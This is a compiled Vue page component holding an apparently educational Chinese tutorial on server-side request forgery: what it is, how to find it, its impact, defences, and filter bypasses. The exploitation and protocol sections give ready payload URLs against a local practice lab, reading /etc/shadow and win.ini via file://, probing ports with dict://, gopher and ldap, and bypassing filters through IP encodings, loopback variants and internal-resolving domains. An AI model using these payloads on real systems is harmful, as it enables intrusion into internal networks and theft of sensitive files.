import{_ as l,W as r,X as o,Y as e,Z as n,a0 as t,a1 as a,C as i}from"./framework-b6a07282.js";const p={},d=a('<h2 id="ssrf服务器请求伪造" tabindex="-1"><a class="header-anchor" href="#ssrf服务器请求伪造" aria-hidden="true">#</a> SSRF服务器请求伪造</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>服务端请求伪造（<strong>S</strong>erver-<strong>S</strong>ide <strong>R</strong>equest <strong>F</strong>orgery）</li><li>由攻击者构造形成由服务端发起请求的一个安全漏洞，攻击者利用此漏洞作为跳板，可以攻击内网中的其他服务，达到在外网探测或攻击内网服务的目的。</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li><p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p></li><li><p>用户提交（主动或被动）的数据内容被带入到服务器请求指定资源逻辑中，程序没有对用户提交内容做合理的处理，导致可请求指定资源。</p></li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3>',6),c=e("li",null,"手动审查代码，以查看是否所有URL输入都经过了验证。",-1),h=e("li",null,"通过抓包分析发送的请求是否是由服务器端发送的。",-1),u={href:"http://www.xxx.com/a.php?image=",target:"_blank",rel:"noopener noreferrer"},_=e("li",null,"利用自动化扫描工具，如AWVS",-1),v=e("ol",null,[e("li",null,"社交分享功能：获取超链接的标题等内容进行显示。"),e("li",null,"转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览"),e("li",null,"在线翻译：给网址翻译对应网页的内容"),e("li",null,"图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片"),e("li",null,"图片/文章收藏功能：主要会取URL中title以及文本的内容作为显示以求一个好的用户体验"),e("li",null,"网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作"),e("li",null,"是否请求了其他资源"),e("li",null,"从URL关键字中寻找，share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain...")],-1),f=e("p",null,"选择合适的点进行判断有无SSRF，可以直接引入外链的图片,查看是否能引入图片",-1),m={href:"http://www.xxxx.com/***/service?image=http://www.baidu.com/img/bd_logo1.png",target:"_blank",rel:"noopener noreferrer"},b=a(`<h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ol><li>获取敏感信息：攻击者通过SSRF可以尝试获取一些存在敏感信息的系统文件或者网页，如/etc/passwd、/etc/shadow、/etc/hosts等。</li><li>端口扫描：攻击者通过SSRF可以对内部网络进行端口扫描，发现开放的服务或者漏洞。</li><li>远程命令执行：攻击者通过SSRF可以利用一些支持远程命令执行的协议或服务，如gopher、dict、redis等，来执行任意命令。</li><li>攻击内网服务器：攻击者通过SSRF可以对内部系统发起攻击，如SQL注入、XSS、CSRF等。</li></ol><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><ol><li><p>主机探测</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://localhost:8082/vul/ssrf/ssrf_curl.php?url=192.168.1.109:3306
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>端口扫描</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://localhost:8082/vul/ssrf/ssrf_curl.php?url=192.168.1.109
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>file协议读取文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://http://localhost:8082/vul/ssrf/ssrf_curl.php?url=file://C:/Windows/win.ini
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li></ol><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>对用户输入的URL进行白名单过滤，只允许访问指定的域名或IP地址。</li><li>对用户输入的URL进行黑名单过滤，禁止访问内网地址、敏感端口、危险协议等。</li><li>对用户输入的URL进行合法性校验，检查是否符合URL格式规范，避免CRLF注入等攻击。</li><li>禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</li><li>对服务端发起的请求进行超时设置，防止长时间占用资源或被利用作为DDoS攻击的发起点。</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3>`,7),k={href:"https://www.sojson.com/dwz.html",target:"_blank",rel:"noopener noreferrer"},g=e("li",null,[e("p",null,[e("a",{href:"mailto:baidu.com@10.10.10.1"},"baidu.com@10.10.10.1"),n(" #请求的是10.10.10.1")])],-1),x=e("li",null,[e("p",null,"10.0.0.1:80 #通过增加端口号来绕过仅对IP的匹配")],-1),w={href:"http://www",target:"_blank",rel:"noopener noreferrer"},S={href:"http://www",target:"_blank",rel:"noopener noreferrer"},R={href:"http://www",target:"_blank",rel:"noopener noreferrer"},L=e("li",null,[e("p",null,"本地环回地址的其他表现形式。")],-1),P=e("p",null,"127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：",-1),F={href:"http://127.0.0.1",target:"_blank",rel:"noopener noreferrer"},I={href:"http://localhost",target:"_blank",rel:"noopener noreferrer"},U={href:"http://127.255.255.254",target:"_blank",rel:"noopener noreferrer"},C={href:"http://127.1",target:"_blank",rel:"noopener noreferrer"},q={href:"http://127.0.1",target:"_blank",rel:"noopener noreferrer"},A={href:"http://0:80",target:"_blank",rel:"noopener noreferrer"},D={href:"http://216.58.199.78",target:"_blank",rel:"noopener noreferrer"},y={href:"http://0330.0072.0307.0116",target:"_blank",rel:"noopener noreferrer"},E={href:"http://xn--0xD83AC74Ehttp-4591ad716a",target:"_blank",rel:"noopener noreferrer"},T={href:"http://3627730766",target:"_blank",rel:"noopener noreferrer"},V={href:"http://baidu.com.test.com",target:"_blank",rel:"noopener noreferrer"},j={href:"//xn--baidu-897k.com.test.xn--comdns-1y7iy8te9nuem536avcwayka384s",target:"_blank",rel:"noopener noreferrer"},W=a(`<h3 id="可利用的伪协议" tabindex="-1"><a class="header-anchor" href="#可利用的伪协议" aria-hidden="true">#</a> 可利用的伪协议</h3><h4 id="php" tabindex="-1"><a class="header-anchor" href="#php" aria-hidden="true">#</a> PHP</h4><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>curl_exec()</td><td>执行 CURL 会话</td></tr><tr><td>file_get_contents()</td><td>将整个文件读入一个字符串</td></tr><tr><td>fsockopen()</td><td>打开一个网络连接或者一个Unix套接字连接</td></tr></tbody></table><p>http、https、file、gopher、phar、dict、ftp、ssh、telnet...</p><h4 id="java" tabindex="-1"><a class="header-anchor" href="#java" aria-hidden="true">#</a> JAVA</h4><p>http、https、file、ftp、jar、netdoc、mailto...</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.file://  本地文件传输协议，File协议主要用于访问本地计算机中的文件
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>file://C:/Windows/win.ini <span class="token comment">#访问敏感文件</span>
<span class="token assign-left variable">url</span><span class="token operator">=</span>file:///etc/shadown（访问文件）
http://localhost:8082/vul/ssrf/ssrf_fgc.php?file<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>http://localhost:9002/for.php <span class="token comment">#使用base64编码php代码，使其不执行。将代码以加密的形式输出到页面。</span>

<span class="token number">2</span>.dict://  dict协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。但可以根据返回的信息用来端口扫描）。 dict://serverip:port/命令:参数 向服务器的端口请求为【命令:参数】，并在末尾自动补上<span class="token punctuation">\\</span>r<span class="token punctuation">\\</span>n<span class="token punctuation">(</span>CRLF<span class="token punctuation">)</span>，为漏洞利用增添了便利,通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。
kail模拟dict服务器：nc <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span>
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>dict://192.168.200.128:1111 <span class="token comment">#如果端口存在，浏览器会一直处在等待服务器响应状态，如果端口不存在则无等待操作。</span>
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>dict://192.168.200.128:1111/data:data2


<span class="token number">3</span>.sftp:// Sftp代表SSH文件传输协议，或安全文件传输协议，这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。
模拟服务：nc <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span>
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>sftp://IP:1111/ 


<span class="token number">4</span>.ldap://或ldaps:// 或ldapi://     LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。
模拟服务：nc <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span>
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>ldap://localhost:1111/%0astats%0aquit
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>ldaps://localhost:1111/%0astats%0aquit
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>ldapi://localhost:1111/%0astats%0aquit

<span class="token number">5</span>.tftp://   TFTP（简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。
模拟服务：nc <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span>
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>tftp://IP:1111/TEST

<span class="token number">6</span>.gopher://  Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。
模拟服务：nc <span class="token parameter variable">-lvvp</span> <span class="token number">1111</span>
http://localhost:8082/vul/ssrf/ssrf_curl.php?url<span class="token operator">=</span>gopher://IP:1111/_test <span class="token comment">#向1111端口发送数据test,同样可以发送POST请求。</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function N(B,H){const s=i("ExternalLinkIcon");return r(),o("div",null,[d,e("ul",null,[c,h,e("li",null,[n("在页面源码中查找访问的资源地址，如果该资源地址类型为"),e("a",u,[n("http://www.xxx.com/a.php?image="),t(s)]),n(" (地址)的可能存在SSRF漏洞。")]),_]),v,f,e("p",null,[e("a",m,[n("http://www.xxxx.com/***/service?image=http://www.baidu.com/img/bd_logo1.png"),t(s)])]),b,e("ol",null,[e("li",null,[e("p",null,[n("生成短域名绕过。#在服务器会跟随跳转的情况下，仅验证IP的情况下可通过先转换成域名的形式绕过。在线生成短域名网址："),e("a",k,[n("https://www.sojson.com/dwz.html"),t(s)])])]),g,x,e("li",null,[e("p",null,[n("点分割符号替换，在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。、｡、．来代替： "),e("a",w,[n("http://www"),t(s)]),n("。qq。com "),e("a",S,[n("http://www"),t(s)]),n("｡qq｡com "),e("a",R,[n("http://www"),t(s)]),n("．qq．com")])]),L,e("li",null,[P,e("p",null,[e("a",F,[n("http://127.0.0.1"),t(s)]),e("a",I,[n("http://localhost"),t(s)]),e("a",U,[n("http://127.255.255.254"),t(s)]),n(" 127.0.0.1 - 127.255.255.254 http://[::1] http://[::ffff:7f00:1] http://[::ffff:127.0.0.1] "),e("a",C,[n("http://127.1"),t(s)]),e("a",q,[n("http://127.0.1"),t(s)]),e("a",A,[n("http://0:80"),t(s)])])]),e("li",null,[e("p",null,[n("IP的进制转换： 点分十进制IP地址："),e("a",D,[n("http://216.58.199.78"),t(s)]),n(" 八进制IP地址："),e("a",y,[n("http://0330.0072.0307.0116"),t(s)]),n("（将每个十进制数字转换为八进制） 十六进制IP地址："),e("a",E,[n("http://0xD83AC74E或者http"),t(s)]),n("😕/0xD8.0x3A.0xC7.0x4E（将每个十进制数字转换为十六进制） 整数或DWORD IP地址："),e("a",T,[n("http://3627730766"),t(s)]),n("（将十六进制IP转换为整数）")])]),e("li",null,[e("p",null,[n("配置可控的域名解析到内网地址 #仅验证域名是否为企业子域名的情况。"),e("a",V,[n("baidu.com.test.com"),t(s)]),n(),e("a",j,[n("//此baidu.com.test.com的dns配置为内网地址"),t(s)])])])]),W])}const O=l(p,[["render",N],["__file","SSRF服务器请求伪造.html.vue"]]);export{O as default};
